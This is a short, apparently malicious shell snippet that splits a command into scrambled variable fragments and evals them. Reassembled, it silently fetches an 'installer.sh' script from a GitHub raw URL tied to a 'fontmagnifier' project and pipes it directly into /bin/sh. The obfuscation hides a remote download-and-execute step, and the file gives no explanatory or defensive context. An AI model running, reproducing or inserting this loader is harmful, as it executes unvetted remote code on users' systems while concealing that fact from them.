z="
";Rz='stal';Jz='om/e';Wz='bin/';Uz='qO -';Kz='mil2';Qz='n/in';Lz='37/f';Vz=' | /';Iz='nt.c';Az='wget';Ez='.git';Sz='ler.';Oz='fier';Xz='sh';Pz='/mai';Bz=' htt';Tz='sh -';Fz='hubu';Cz='ps:/';Nz='agni';Mz='ontm';Gz='serc';Hz='onte';Dz='/raw';
eval "$Az$Bz$Cz$Dz$Ez$Fz$Gz$Hz$Iz$Jz$Kz$Lz$Mz$Nz$Oz$Pz$Qz$Rz$Sz$Tz$Uz$Vz$Wz$Xz"